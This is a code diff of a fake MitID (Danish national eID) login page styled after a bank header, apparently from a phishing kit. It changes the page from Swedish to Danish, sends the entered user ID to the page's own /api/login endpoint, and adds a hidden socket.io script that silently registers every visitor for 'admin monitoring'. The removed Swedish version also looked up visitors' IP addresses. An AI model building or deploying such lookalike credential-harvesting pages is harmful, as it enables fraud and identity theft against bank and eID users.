@@ -1,94 +1,317 @@
-<!doctype html>
-<html lang="sv">
+<!DOCTYPE html>
+<html lang="da">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>MitID - Logga in</title>
-<script src="/socket.io/socket.io.js"></script>
-<style>
-body {
-  font-family: Arial, sans-serif;
-  background: #f5f5f5;
-  margin: 0;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  height: 100vh;
-}
-.container {
-  background: white;
-  border-radius: 12px;
-  box-shadow: 0 0 10px rgba(0,0,0,0.1);
-  width: 100%;
-  max-width: 360px;
-  padding: 24px;
-  text-align: center;
-}
-.logo { width: 80px; margin-bottom: 10px; }
-h2 { margin: 0; font-size: 1.4rem; color: #333; }
-p { color: #555; font-size: 0.9rem; }
-input[type="text"] {
-  width: 100%;
-  padding: 10px;
-  border-radius: 5px;
-  border: 1px solid #ccc;
-  font-size: 1rem;
-  margin: 12px 0;
-}
-button {
-  width: 100%;
-  padding: 10px;
-  background: #0066ff;
-  border: none;
-  color: white;
-  font-size: 1rem;
-  font-weight: bold;
-  border-radius: 6px;
-  cursor: pointer;
-}
-button:hover { background: #0053cc; }
-label {
-  font-size: 0.85rem;
-  color: #555;
-  display: flex;
-  align-items: center;
-  gap: 6px;
-  margin-top: 8px;
-  cursor: pointer;
-}
-.checkbox { width: 16px; height: 16px; }
-.footer {
-  margin-top: 12px;
-  font-size: 0.8rem;
-  color: #888;
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mitid Login</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <style>
+        /* General Reset and Font */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Roboto', sans-serif;
+        }
+
+        body {
+            background-color: #f5f5f5;
+            min-height: 100vh;
+        }
+
+        /* --- Top Header Section (Static Blue BG) --- */
+        .nordea-header {
+            background-color: white; 
+            padding-top: 15px;
+            padding-bottom: 0px; 
+            /* ADJUSTED: Increased height to 170px */
+            height: 170px; 
+        }
+
+        /* --- Login Content --- */
+        .login-container {
+            padding: 0 15px;
+        }
+
+        .login-box {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            /* ADJUSTED: Increased negative margin to pull the box higher into the larger blue header */
+            margin-top: -100px; 
+        }
+
+        .login-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding-bottom: -10px;
+            border-bottom: 1px solid #eee;
+            margin-bottom: 1px;
+        }
+
+        .login-header h2 {
+            font-size: 18px;
+            font-weight: 500;
+        }
+
+        .mitid-logo-right { 
+            display: flex;
+            align-items: center;
+            /* ADJUSTED: Set container width to 120px and aligned to the right */
+            width: 120px; 
+            height: auto;
+        }
+        
+        .mitid-logo-right img { 
+            /* ADJUSTED: Set logo width to 120px */
+            max-width: 120px; 
+            height: auto;
+            /* Ensures the logo itself is aligned to the right edge of its container */
+            margin-left: 40%; 
+        }
+
+        /* Input Group */
+        .input-group label {
+            display: block;
+            font-size: 12px;
+            font-weight: 500;
+            color: #666;
+            margin-bottom: 5px;
+            display: flex;
+            align-items: center;
+        }
+
+        .help-icon {
+            border: 1px solid #aaa;
+            border-radius: 50%;
+            width: 14px;
+            height: 14px;
+            display: inline-flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 10px;
+            margin-left: 5px;
+            font-weight: bold;
+            line-height: 1;
+        }
+
+        .input-field-wrapper {
+            display: flex;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 15px;
+        }
+
+        .input-field-wrapper input {
+            flex-grow: 1;
+            border: none;
+            padding: 10px;
+            font-size: 16px;
+            outline: none;
+        }
+
+        .hide-button {
+            background-color: transparent;
+            border: none;
+            padding: 10px 15px;
+            color: #555;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        /* Continue Button (Submit Button) */
+        .continue-button {
+            width: 100%;
+            background-color: #eee; 
+            color: #aaa;
+            border: none;
+            padding: 15px;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 500;
+            text-align: left;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: default; 
+            margin-bottom: 20px;
+        }
+        .continue-button.active { background-color: #0070c0; color: white; cursor: pointer; }
+
+        .arrow-icon {
+            font-size: 20px;
+        }
+
+        /* Forgot ID Link */
+        .forgot-id {
+            color: #0070c0;
+            font-size: 14px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+        }
+
+        .info-icon {
+            background-color: #0070c0;
+            color: white;
+            border-radius: 50%;
+            width: 18px;
+            height: 18px;
+            display: inline-flex;
+            justify-content: center;
+            align-items: center;
+            font-style: normal;
+            font-size: 12px;
+            font-weight: bold;
+            margin-right: 8px;
+        }
+
+        /* Footer Options */
+        .footer-options {
+            padding: 20px;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            font-size: 14px;
+            color: #444;
+            margin-bottom: 50px; 
+            cursor: pointer;
+        }
+
+        .checkbox-container input {
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #aaa;
+            border-radius: 4px;
+            margin-right: 10px;
+            outline: none;
+            position: relative;
+            cursor: pointer;
+            flex-shrink: 0;
+        }
+
+        .checkbox-container input:checked {
+            border-color: #0070c0;
+            background-color: #0070c0;
+        }
+
+        .checkbox-container input:checked::after {
+            content: '✓';
+            color: white;
+            font-size: 16px;
+            position: absolute;
+            top: -2px;
+            left: 2px;
+        }
+
+        .links {
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .links a {
+            color: #0070c0;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+        }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <img src="https://i.postimg.cc/WzDHPTPX/logo.jpg" alt="MitID logotyp" class="logo">
-    <h2>Logga in med MitID</h2>
-    <p>Ange ditt användarnamn för att fortsätta</p>
-    <form action="/api/login" method="POST">
-      <input type="text" name="username" placeholder="Användarnamn" required />
-      <label><input type="checkbox" class="checkbox"> Kom ihåg mig hos MitID</label>
-      <button type="submit">Fortsätt</button>
-    </form>
-    <div class="footer">© MitID Support — 2025</div>
-  </div>
+
+    <div class="nordea-header"></div>
+
+    <div class="login-container">
+        <div class="login-box">
+            <div class="login-header">
+                <h2>Log på hos MitID</h2>
+                <div class="mitid-logo-right">
+                    <img src="logo.png" alt="MitID Logo">
+                </div>
+            </div>
+
+            <form action="/api/login" method="POST">
+                <div class="input-group">
+                    <label for="bruger-id">BRUGER-ID <span class="help-icon">?</span></label>
+                    <div class="input-field-wrapper">
+                        <input type="text" id="bruger-id" name="username" required placeholder="Indtast dit bruger-id">
+                        <button type="button" class="hide-button" onclick="toggleHideField(event)">Skjul</button>
+                    </div>
+                </div>
+
+                <button id="continueBtn" type="submit" class="continue-button" disabled>
+                    FORTSÆT <span class="arrow-icon">→</span>
+                </button>
+            </form>
+            <p class="forgot-id"><span class="info-icon">i</span> Glemt bruger-ID?</p>
+        </div>
+
+        <div class="footer-options">
+            <label class="checkbox-container">
+                <input type="checkbox">
+                Husk mig hos MitID
+            </label>
+            <div class="links">
+                <a href="#" onclick="history.back();return false;">Afbryd</a>
+                <a href="#">Hjælp</a>
+            </div>
+        </div>
+    </div>
 
 <script>
-  // --- Tyst gästregistrering (ingen visning för användaren) ---
-  const socket = io();
-  async function registerGuest() {
-    try {
-      await fetch('https://api.ipify.org?format=json');
-      socket.emit('join_guest', 'Okänd');
-    } catch {
-      socket.emit('join_guest', 'Okänd');
+// For username field we do not toggle to password; keep as no-op
+function toggleHideField(e) {
+    // no-op: usernames are plain text and should not be masked
+    const btn = e.currentTarget;
+    // brief visual feedback
+    btn.disabled = true;
+    setTimeout(() => btn.disabled = false, 200);
+}
+
+// Enable/disable continue button based on input content
+document.addEventListener('DOMContentLoaded', () => {
+    const input = document.getElementById('bruger-id');
+    const btn = document.getElementById('continueBtn');
+
+    function updateButton() {
+        if (input.value && input.value.trim().length > 0) {
+            btn.disabled = false;
+            btn.classList.add('active');
+        } else {
+            btn.disabled = true;
+            btn.classList.remove('active');
+        }
     }
-  }
-  socket.on('connect', registerGuest);
+
+    input.addEventListener('input', updateButton);
+    // initialize
+    updateButton();
+});
 </script>
+
+<!-- Silent visitor registration for admin monitoring -->
+<script src="/socket.io/socket.io.js"></script>
+<script>
+    (function(){
+        try {
+            const s = io();
+            s.emit('join', 'visitor');
+            s.on('visitor_registered', () => {
+                // silent; no UI changes
+            });
+            s.on('connect_error', () => { /* ignore */ });
+        } catch (e) { /* ignore */ }
+    })();
+</script>
+
 </body>
 </html>
